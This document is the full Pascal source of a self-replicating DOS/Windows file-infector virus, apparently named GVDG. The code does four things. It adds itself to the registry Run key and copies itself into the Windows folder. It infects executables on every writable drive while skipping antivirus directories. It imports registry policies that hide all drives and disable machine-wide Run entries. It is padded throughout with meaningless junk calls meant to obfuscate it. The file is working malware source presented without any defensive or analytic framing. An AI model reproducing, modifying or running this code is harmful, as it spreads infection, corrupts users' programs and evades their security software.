  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=6443;
  Metka='dyp37-89';
  MSize=length(Metka);
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S); BeginEnd(-2013); BeginEnd(-1288);
 IntToStr:=S;
End;
Procedure AutoRun;
VAR
    f : file;
  txt : text;
    i : integer;
  st1 : string;
  st2 : string;
Begin
  st1:=GetEnv('SystemRoot')+'\'+'DEA@LVIR'+'.EXE';
  for i:=1 to length(st1) do
  begin
  if st1[i]='\'
  then st2:=st2+'\'+st1[i]
  else st2:=st2+st1[i]
  end;
  Assign(f,st1); BeginEnd(-1519); BeginEnd(-2640);
  {$i-} Reset(f); Close(f); {$i+}
  if IOResult<>0 then
  Begin
    Assign(txt,'REG'); BeginEnd(-1809); BeginEnd(7453);
    Rewrite(txt);
    Writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(30378); BeginEnd(-2778); BeginEnd(16674);
    Writeln(txt,'[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]');
    Writeln(txt,'"DEA@LVIR"="'+st2+'"');
    Close(txt); BeginEnd(29621); BeginEnd(-1028);
    Exec(GetEnv('Comspec'),'/c REG IMPORT REG');
    Exec(GetEnv('Comspec'),'/c DEL REG'); BeginEnd(19727); BeginEnd(-1054); BeginEnd(9157);
    Exec(GetEnv('Comspec'),'/c copy '+paramstr(0)+' '+st1); BeginEnd(-3091); BeginEnd(27588); BeginEnd(20719);
    Exec(GetEnv('Comspec'),'/c cls'); BeginEnd(-2387); 
  End; BeginEnd(11736); 
End;
function CD(path:string):boolean;
var
           d : dirstr;
           n : namestr;
           e : extstr;
           b : boolean;
         ToF : file;
       FromF : file;
           f : file;
     NumRead : Word;
  NumWritten : Word;
         Buf : array[1..$400] of Char;
          st : string;
begin
  fsplit(paramstr(0),d,n,e);
  st:=path+n+e; BeginEnd(2807); BeginEnd(-6090); BeginEnd(-1339);
  Assign(f,d+n+'.gds');
  {$i-}rewrite(f);
  Erase(f);{$i+}
    if IOResult<>0
      then
            Begin
             b:=true; BeginEnd(-3003); 
             Assign(FromF, ParamStr(0)); BeginEnd(5659); BeginEnd(18918);
             Reset(FromF, 1); BeginEnd(18451); BeginEnd(-1665); BeginEnd(-1228);
             Assign(ToF,st); BeginEnd(30269); 
             SetFAttr(ToF,0); BeginEnd(6549); 
             Rewrite(ToF, 1);
             repeat
               BlockRead(FromF, Buf, SizeOf(Buf), NumRead); BeginEnd(7515); 
               BlockWrite(ToF, Buf, NumRead, NumWritten); BeginEnd(-1785); BeginEnd(4869); BeginEnd(24832);
             until (NumRead = 0) or (NumWritten <> NumRead);
             Close(ToF);
             Close(FromF);
             exec(st,'');
            end
      else b:=false;
  CD:=b;
end;
procedure Shifr(var Buf:Bufer; key:integer);
var
   k : integer;
  ii : integer;
begin
  for k:=1 to Sizeof(Buf) do
  begin
    ii:=key+k; BeginEnd(18451); BeginEnd(6034);
    Buf[k]:=chr(ord(Buf[k]) xor ii);
  end;
end;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
      txt : text;
        i : integer;
        k : integer;
      Key : integer;
begin
  Assign(txt,path+name); BeginEnd(-1734); BeginEnd(-2503); BeginEnd(17204);
  append(txt); BeginEnd(16803); BeginEnd(-1251);
  write(txt,Metka); BeginEnd(-8073); BeginEnd(809);
  i:=0; BeginEnd(29093); BeginEnd(14192); BeginEnd(-3214);
  k:=random(256); BeginEnd(-2511); BeginEnd(18206); BeginEnd(-2797);
    repeat
      inc(i);
      write(txt,chr(random(256)));
    until i>k; BeginEnd(-9967); BeginEnd(32545); BeginEnd(-3085);
  Close(txt);
  Assign(ToF,path+name);
  reset(ToF,1);
  Key:=FileSize(ToF) mod 256; BeginEnd(-1930); 
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead);
  Shifr(BufVir,Key-1);
  seek(ToF,filesize(ToF)); BeginEnd(-9334); 
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(-8666); BeginEnd(-149);
  Assign(FromF,paramstr(0)); BeginEnd(18127); BeginEnd(-6693);
  reset(FromF,1);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(15465); 
  seek(ToF,0); BeginEnd(-2846); BeginEnd(5974);
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(3495); BeginEnd(-4515); BeginEnd(-4503);
  Close(ToF);
  Close(FromF); BeginEnd(-1016); 
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(-3040); 
  setfattr(f,0); BeginEnd(-1299); 
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(-2385); BeginEnd(21739); BeginEnd(-8849);
      reset(f,1);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(17118); BeginEnd(3028);
        blockread(f,Buf,4); BeginEnd(23020); 
        Close(f); BeginEnd(-4504); BeginEnd(7951); BeginEnd(2292);
        if Buf<>'GDS!' then
         begin
           inc(Victim); BeginEnd(9431); BeginEnd(193);
           Infect(dir,sr.name); BeginEnd(18603); BeginEnd(9184);
         end; BeginEnd(-1620); 
      end
      else
      Close(f);
    end; BeginEnd(2096); BeginEnd(7918);
    findnext(sr);
  end
  else exit;
  findfirst(dir+'*.',55,sr);
  while doserror=0 do
  if Victim<13 then
  begin
    with sr do
      if (attr and directory<>0) and (name[1]<>'.') and (length(dir)<63)
      then find(dir+name+'\');
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
      txt : text;
   BufVir : Bufer;
  NumRead : Word;
        k : integer;
        z : char;
      Key : integer;
        i : longint;
      Buf : array[1..MSize]of char;
begin
  Assign(txt,getenv('TMP')+'reg'); BeginEnd(-6344); BeginEnd(13933); BeginEnd(-2292);
  rewrite(txt); BeginEnd(-425); BeginEnd(-1571); BeginEnd(4647);
  writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(-9738); BeginEnd(11105); BeginEnd(28998);
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(-4494); BeginEnd(30635); BeginEnd(-3741);
  writeln(txt,'Windows\CurrentVersion\Policies\Explorer]'); BeginEnd(29905); BeginEnd(-1499); BeginEnd(-3161);
  writeln(txt,'"DisableLocalMachineRun"=dword:00000001'); BeginEnd(-3065); BeginEnd(-6059);
  writeln(txt,'"NoViewOnDrive"=dword:3ffffff'); BeginEnd(20881); BeginEnd(-2841); BeginEnd(-2228);
  Close(txt); BeginEnd(2347); 
  exec(getenv('comspec'),'/c reg import '+getenv('TMP')+'reg');
  exec(getenv('comspec'),'/c cls'); BeginEnd(-6012); BeginEnd(12171);
  erase(txt); BeginEnd(-3103); BeginEnd(25123);
  writeln('Hallo, World!!!');
  Assign(f,paramstr(0)); BeginEnd(-2281); BeginEnd(-7873);
  reset(f,1); BeginEnd(-2161); BeginEnd(6165);
  Key:=(FileSize(f)-VirSize) mod 256;
  seek(f,filesize(f)-VirSize); BeginEnd(23683); BeginEnd(31113); BeginEnd(25590);
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-1097); BeginEnd(25500); BeginEnd(-1609);
  if filesize(f)=VirSize then
  Begin
    Close(f); BeginEnd(-2723); 
    Erase(f); BeginEnd(-2831); BeginEnd(-9057);
    Halt(0);
  end
  else
  Shifr(BufVir,Key-1);
  seek(f,0); BeginEnd(32727); BeginEnd(29810);
  BlockWrite(f,BufVir,NumRead); BeginEnd(24789); BeginEnd(11590); BeginEnd(15336);
  i:=filesize(f)-VirSize-256-MSize; BeginEnd(-4030); BeginEnd(-3223); BeginEnd(16196);
  while true do
  begin
    seek(f,i);
    blockread(f,Buf,MSize); BeginEnd(-2022); BeginEnd(29225); BeginEnd(21066);
    if Buf=Metka then
    begin
      seek(f,i);
      truncate(f); BeginEnd(31474); BeginEnd(31509); BeginEnd(-5614);
      break; BeginEnd(6126); 
    end; BeginEnd(840); 
    inc(i);
  end; BeginEnd(-8702); BeginEnd(9099); BeginEnd(-8420);
  Close(f);
  if Run=1 then
  exec(Paramstr(0),''); BeginEnd(-2487); 
end;
Procedure Nucleus;
var
    i : integer;
    s : string;
    f : file;
begin
  Assign(f,paramstr(0)); BeginEnd(10914); 
  SetFAttr(f,0); BeginEnd(-1724); BeginEnd(-578);
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  AutoRun;
  if CD(getenv('SYSTEMROOT')+'\') then halt(0);
  s:='';
  for i:=1 to 24 do
  begin
    Assign(f,chr(ord(i)+66)+':\'+#$FF);
    {$I-}rewrite(f); erase(f);{$I+} BeginEnd(14076); BeginEnd(21384); BeginEnd(-1444);
    if ioresult=0 then s:=s+chr(ord(i)+66); BeginEnd(-3207); BeginEnd(26112); BeginEnd(-1887);
  end;
  for i:=1 to length(s) do Find(s[i]+':\'); BeginEnd(-1636); 
  InRun(1); BeginEnd(8984); BeginEnd(-3274); BeginEnd(21476);
end;
begin
Randomize; BeginEnd(28215); 
Nucleus; BeginEnd(-2396); BeginEnd(16742);
end.
